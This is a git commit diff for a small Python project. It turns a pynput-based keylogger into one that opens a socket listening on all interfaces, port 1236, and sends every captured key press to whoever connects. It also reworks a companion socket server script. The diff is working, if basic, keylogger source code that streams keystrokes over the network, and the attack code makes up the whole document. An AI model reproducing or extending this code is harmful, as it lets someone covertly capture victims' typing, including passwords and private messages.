93822cd8a899da565aa3951193523b1e25414001
Tyler-Oreskey <toreskey@gmail.com>
2023-10-04 03:35:20 +0000

    commit

--- Keylogger.py
+++ Keylogger.py
@@ -16,21 +16,32 @@ from pynput import keyboard
 #     listener.start()
 #     input()
 
+import socket
+
 class Keylogger:
     def __init__(self):
         self.key = ""
         self.listener = None
+        self.port = 1236
+        self.host = "0.0.0.0"
+        self.server_socket = None
+        self.conn = None
+        self.address = ""
     
     def start(self):
+        self.server_socket = socket.socket()
+        self.server_socket.bind((self.host, self.port))
+        self.server_socket.listen(1)
+
+        self.conn, self.address = self.server_socket.accept()
+
         self.listener = keyboard.Listener(on_press=self.log)
         self.listener.start()
 
     def log(self, key):
-        self.key = key
+        self.conn.send(str(key).encode())
 
     def stop(self):
         self.listener.stop()
         self.listener = None
-
-    def get(self):
-        return self.key
+        self.conn.close()
--- server.py
+++ server.py
@@ -1,39 +1,4 @@
-# import socket
-
-# from Keylogger import Keylogger
-
-# def server_program():
-#     # get the hostname
-#     port = 1236
-
-#     #bind to all network interfaces on host ip
-#     host = "0.0.0.0"
-
-#     server_socket = socket.socket()  # get instance
-#     # look closely. The bind() function takes tuple as argument
-#     server_socket.bind((host, port))  # bind host address and port together
-
-#     # configure how many clients the server can listen to simultaneously
-#     server_socket.listen(1)
-#     conn, address = server_socket.accept()  # accept new connection
-
-#     print("Connection from: " + str(address))
-    
-#     message = input(" -> ")  # take input
-
-#     while message.lower().strip() != 'bye':
-#         conn.send(message.encode())  # send message
-#         message = input(" -> ")  # again take input
-
-#     conn.close()  # close the connection
-
-# if __name__ == '__main__':
-#     server_program()
-
-
 import socket
-
-from Keylogger import Keylogger
 
 def server_program():
     # get the hostname
@@ -46,21 +11,19 @@ def server_program():
     # look closely. The bind() function takes tuple as argument
     server_socket.bind((host, port))  # bind host address and port together
 
-    # # configure how many clients the server can listen to simultaneously
-    # server_socket.listen(1)
-    # conn, address = server_socket.accept()  # accept new connection
+    # configure how many clients the server can listen to simultaneously
+    server_socket.listen(1)
+    conn, address = server_socket.accept()  # accept new connection
 
-    # print("Connection from: " + str(address))
+    print("Connection from: " + str(address))
+    
+    message = input(" -> ")  # take input
 
-    keylogger = Keylogger()
-    keylogger.start()
-    print(keylogger.get() + " --------")
+    while message.lower().strip() != 'bye':
+        conn.send(message.encode())  # send message
+        message = input(" -> ")  # again take input
 
-    # while message.lower().strip() != 'bye':
-    #     conn.send(message.encode())  # send message
-    #     message = input(" -> ")  # again take input
-
-    # conn.close()  # close the connection
+    conn.close()  # close the connection
 
 if __name__ == '__main__':
     server_program()
